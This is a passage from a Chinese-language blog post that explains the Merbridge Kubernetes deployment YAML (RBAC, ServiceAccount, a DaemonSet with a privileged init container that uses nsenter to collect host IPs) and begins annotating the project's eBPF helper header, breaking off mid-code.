#想要创建对象的类别</span><br><span class="line">metadata: #帮助唯一性标识对象的一些数据</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">rules:</span><br><span class="line">- apiGroups: #空字符串表明使用core API group</span><br><span class="line">  - ""</span><br><span class="line">  resources:</span><br><span class="line">  - pods</span><br><span class="line">  verbs: #对资源对象执行的操作</span><br><span class="line">  - list</span><br><span class="line">  - get</span><br><span class="line">  - watch</span><br></pre></td></tr></table></figure><p>第二段，在集群范围执行授权，这里对集群角色权限进行绑定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding #在集群范围执行授权</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">roleRef: #指定与某 Role 或 ClusterRole 的绑定关系</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole # 此字段必须是 Role 或 ClusterRole</span><br><span class="line">  name: merbridge # 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配</span><br><span class="line">subjects: #用来尝试操作集群的对象</span><br><span class="line">- kind: ServiceAccount #为Pod中的进程和外部用户提供身份信息</span><br><span class="line">  name: merbridge</span><br><span class="line">  namespace: istio-system</span><br></pre></td></tr></table></figure><p>第三段，为pod指定服务账户，命名空间为<code>istio-system</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">  namespace: istio-system</span><br></pre></td></tr></table></figure><p>第四段创建DaemonSet类型的pod。我们将内容拆为两部分说明</p><p><code>initContainers</code></p><p>首先我们看一下<code>initContainers</code>的挂载卷，需要说明的是，使用卷时, 在 <code>.spec.volumes</code> 字段中设置为 Pod 提供的卷，并在 <code>.spec.containers[*].volumeMounts</code> 字段中声明卷在容器中的挂载位置。因此我们先看一下<code>.spec.volumes</code>字段，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">volumes:</span><br><span class="line">      - hostPath: </span><br><span class="line">          path: /sys/fs</span><br><span class="line">        name: sys-fs</span><br><span class="line">      - hostPath:</span><br><span class="line">          path: /proc</span><br><span class="line">        name: host-proc</span><br><span class="line">      - emptyDir: &#123;&#125; </span><br><span class="line">        name: host-ips</span><br></pre></td></tr></table></figure><p>这里用到了两种存储卷类型，分别是<code>hostPath</code>和<code>emptyDir</code>。对于<code>hostPath</code>类型，会映射node文件系统中的文件或者目录到pod里。而对于<code>emptyDir</code>类型，K8s会在Node上自动分配一个目录，因此无需指定宿主机Node上对应的目录文件。</p><p>接着我们回到<code>initContainers</code>中。看到<code>initContainers</code>有两个<code>mountPath</code>。用到了<code>.spec.volumes</code>下的<code>host-ips</code>和<code>host-proc</code>，挂载路径为容器中的<code>/host/ips</code>和<code>/host/proc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">initContainers: #Init容器是一种特殊容器，在Pod内的应用容器启动之前运行</span><br><span class="line">      - image: ghcr.io/merbridge/merbridge:latest</span><br><span class="line">        imagePullPolicy: Always</span><br><span class="line">        name: init</span><br><span class="line">        args:</span><br><span class="line">        - sh</span><br><span class="line">        - -c</span><br><span class="line">        - nsenter --net=/host/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;' | tee /host/ips/ips.txt</span><br><span class="line">        resources: </span><br><span class="line">          requests:</span><br><span class="line">            cpu: 100m</span><br><span class="line">            memory: 50Mi</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 300m</span><br><span class="line">            memory: 50Mi</span><br><span class="line">        securityContext:</span><br><span class="line">          privileged: true</span><br><span class="line">        volumeMounts:</span><br><span class="line">          - mountPath: /host/ips </span><br><span class="line">            name: host-ips</span><br><span class="line">          - mountPath: /host/proc</span><br><span class="line">            name: host-proc</span><br></pre></td></tr></table></figure><p>挂载完成后，我们看一下执行参数。这里用到了<code>nsenter</code>命令。nsenter命令是一个可以在指定进程的命令空间下运行指定程序的命令。它位于util-linux包中。<br>具体使用可参考如下连接：<a href="https://juejin.cn/post/7038531145113452581" target="_blank" rel="noopener">https://juejin.cn/post/7038531145113452581</a><br><code>--net</code>进入<code>net</code>命令空间，并指定了文件的命令空间。<code>nsenter --net=/host/proc/1/ns/net ip -o addr</code>命令可以查看主机的ip地址信息。在主机上测试如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr</span><br><span class="line">1: lo    inet 127.0.0.1/8 scope host lo\       valid_lft forever preferred_lft forever</span><br><span class="line">1: lo    inet6 ::1/128 scope host \       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160    inet 192.168.19.84/16 brd 192.168.255.255 scope global ens160\       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160    inet6 fe80::250:56ff:fe82:8bd7/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0    inet6 fe80::42:8aff:fe54:fa57/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">4: flannel.1    inet 10.244.0.0/32 scope global flannel.1\       valid_lft forever preferred_lft forever</span><br><span class="line">4: flannel.1    inet6 fe80::e4a0:b4ff:fe2e:2c1f/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">5: cni0    inet 10.244.0.1/24 brd 10.244.0.255 scope global cni0\       valid_lft forever preferred_lft forever</span><br><span class="line">5: cni0    inet6 fe80::a4b8:52ff:fef8:6b8a/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">6: vethffb04bf6    inet6 fe80::24c6:d7ff:fe20:b8b7/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">7: vethf2b12fbf    inet6 fe80::e83b:a4ff:fe7b:7321/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">8: vethec8e53c3    inet6 fe80::d44b:31ff:fe17:a41c/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">9: vethfa223ce0    inet6 fe80::5855:4fff:feef:92f0/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">10: vethcbd6c656    inet6 fe80::c09c:62ff:fe21:df97/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">11: vethf18457c5    inet6 fe80::b8ba:35ff:fe1f:505f/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">12: veth4bbafc0f    inet6 fe80::186e:7aff:fe98:59e4/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">13: veth2757e288    inet6 fe80::4cb5:dff:fea6:d245/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">14: veth40c1c447    inet6 fe80::4468:7bff:fe40:6b09/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">15: vethc01359c4    inet6 fe80::61:aeff:fece:58ee/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">16: vethf3f6e93e    inet6 fe80::30ee:22ff:fee8:2fee/64 scope link \       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>这里有人可能会想为什么不直接使用<code>ip -o addr</code>呢，从下面结果看到这两条命令的执行结果是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br></pre></td></tr></table></figure><p>需要提一点的是，nsenter命令一个最典型的用途就是进入容器的网络命令空间。相当多的容器为了轻量级，是不包含较为基础的命令的，比如说<code>ip address</code>，<code>ping</code>，<code>telnet</code>，<code>ss</code>，<code>tcpdump</code>等等命令，这就给调试容器网络带来相当大的困扰。</p><p><code>awk &#39;{print $4}&#39;</code>，这句命令是对每行按照空格或TAB分割，输出第四项</p><p>awk用法：<a href="https://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-awk.html</a></p><p>主机测试如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br></pre></td></tr></table></figure><p>之后通过tee命令将结果写入到<code>/host/ips/ips.txt</code>中。</p><p>从这里我们就可以看到，初始化容器的作用就是获取主机的ip地址信息，并将结果存入到<code>ips.txt</code>中。 Init 容器初始化完毕后就会自动终止，但是 Init 容器初始化结果会保留到应用容器和sidecar容器中。</p><p><code>containers</code></p><p><code>containers</code>和初始化容器的镜像是相同的。<code>containers</code>中也有两个<code>mountPath</code>。用到了<code>.spec.volumes</code>下的<code>host-ips</code>和<code>sys-fs</code>，挂载路径为容器中的<code>/host/ips</code>和<code>/sys/fs</code>，通过<code>securityContext</code>定义了容器需要特权模式运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">containers:</span><br><span class="line">      - image: ghcr.io/merbridge/merbridge:latest</span><br><span class="line">        imagePullPolicy: Always</span><br><span class="line">        name: merbridge</span><br><span class="line">        args: #为容器设置启动时要执行的命令和参数</span><br><span class="line">        - /app/mbctl</span><br><span class="line">        - -m</span><br><span class="line">        - istio</span><br><span class="line">        - --ips-file</span><br><span class="line">        - /host/ips/ips.txt</span><br><span class="line">        lifecycle: </span><br><span class="line">          preStop: </span><br><span class="line">            exec:</span><br><span class="line">              command: </span><br><span class="line">              - make</span><br><span class="line">              - -k</span><br><span class="line">              - clean</span><br><span class="line">        resources: </span><br><span class="line">          requests:</span><br><span class="line">            cpu: 100m</span><br><span class="line">            memory: 200Mi</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 300m</span><br><span class="line">            memory: 200Mi</span><br><span class="line">        securityContext: </span><br><span class="line">          privileged: true</span><br><span class="line">        volumeMounts: </span><br><span class="line">          - mountPath: /sys/fs</span><br><span class="line">            name: sys-fs</span><br><span class="line">          - mountPath: /host/ips</span><br><span class="line">            name: host-ips</span><br></pre></td></tr></table></figure><p>看一下该容器中的执行参数。通过源码我们看到<code>-m</code>是服务网格的模式，当前所支持的是<code>istio</code>和<code>linkerd</code>。这里我们使用的是<code>istio</code>，<code>--ips-file</code>是当前节点的ip信息的文件名，即在<code>initContainers</code>中我们将ip信息写入的路径<code>/host/ips/ips.txt</code>。</p><p><code>lifecycle</code>字段是管理容器在运行前和关闭前的一些动作。其中<code>preStop</code>是容器被终止前的任务，用于优雅关闭应用程序、通知其他系统。这里在容器被终止前执行<code>make clean</code>用于清除之前编译的可执行文件及配置文件。</p><p>第五段，pod相应策略</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dnsPolicy: ClusterFirst #针对每个Pod设置DNS的策略,ClusterFirst为默认配置</span><br><span class="line">nodeSelector: #约束一个Pod只能在特定的节点上运行</span><br><span class="line">  kubernetes.io/os: linux</span><br><span class="line">priorityClassName: system-node-critical #将Pod标记为关键性</span><br><span class="line">restartPolicy: Always</span><br><span class="line">serviceAccount: merbridge</span><br><span class="line">serviceAccountName: merbridge</span><br><span class="line">tolerations: #应用于Pod上的，允许Pod调度到带有与之匹配的污点的节点上。</span><br><span class="line">- key: CriticalAddonsOnly #允许pod被重新调度</span><br><span class="line">  operator: Exists</span><br><span class="line">- operator: Exists</span><br></pre></td></tr></table></figure><h4 id="eBPF程序分析"><a href="#eBPF程序分析" class="headerlink" title="eBPF程序分析"></a>eBPF程序分析</h4><h5 id="helpers-h"><a href="#helpers-h" class="headerlink" title="helpers.h"></a><code>helpers.h</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/swab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) __builtin_bswap16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htonl(x) __builtin_bswap32(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htonl(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"__BYTE_ORDER__ error"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __section</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __section(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//存储socket信息的映射表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取组id</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_pid_tgid)() = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_pid_tgid;</span><br><span class="line"><span class="comment">//获取uid</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_uid_gid)() = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_uid_gid;</span><br><span class="line"><span class="comment">//根据用户定义的输出，将BPF程序产生的对应日志消息保存在用来跟踪内核的文件夹</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*bpf_trace_printk)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, <span class="keyword">int</span> fmt_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                ...)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_trace_printk;</span><br><span class="line"><span class="comment">//用当前进程名字填充第一个参数地址</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_comm)(<span class="keyword">void</span> *buf, __u32 size_of_buf) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_comm;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取套接字的cookie，套接字通过bpf_sock_ops获得</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_socket_cookie_ops)(struct bpf_sock_ops *skops) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_socket_cookie;</span><br><span class="line"><span class="comment">//获取套接字的cookie，套接字通过bpf_sock_addr获得</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_socket_cookie_addr)(struct bpf_sock_addr *ctx) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_socket_cookie;</span><br><span class="line"><span class="comment">//在bpf_map中查找与key关联的条目</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *(*bpf_map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">void</span> *key) =</span><br><span class="line">    (<span class="keyword">void</span> *)BPF_FUNC_map_lookup_elem;</span><br><span class="line"><span class="comment">//添加或更新map中key关联的条目</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">void</span> *key,</span><br><span class="line">                                    <span class="keyword">const</span> <span class="keyword">void</span> *value, __u64 flags) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_map_update_elem;</span><br><span class="line"><span class="comment">//在子网络名称空间netns中查找与TCP套接字匹配的元组</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock</span> *(*<span class="title">bpf_sk_lookup_tcp</span>)(</span></span><br><span class="line"><span class="class">    <span class="title">void</span> *<span class="title">ctx</span>, <span class="title">struct</span> <span class="title">bpf_sock_tuple</span> *<span class="title">tuple</span>, __<span class="title">u32</span> <span class="title">tuple_size</span>, __<span class="title">u64</span> <span class="title">netns</span>,</span></span><br><span class="line"><span class="class">    __<span class="title">u64</span> <span class="title">flags</span>) = (<span class="title">void</span> *)<span class="title">BPF_FUNC_sk_lookup_tcp</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_sk_release)</span><span class="params">(struct bpf_sock *sock)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_sk_release;</span><br><span class="line"><span class="comment">//添加或更新引用套接字的sockhash map</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_sock_hash_update)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    struct bpf_sock_ops *skops, struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">    __u64 flags)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_sock_hash_update;</span><br><span class="line"><span class="comment">//消息重定向</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_msg_redirect_hash)</span><span class="params">(struct sk_msg_md *md, struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">void</span> *key, __u64 flags)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_msg_redirect_hash;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PRINTNL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_SUFFIX <span class="meta-string">"\n"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_SUFFIX <span class="meta-string">""</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> printk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> printk(fmt, ...)                               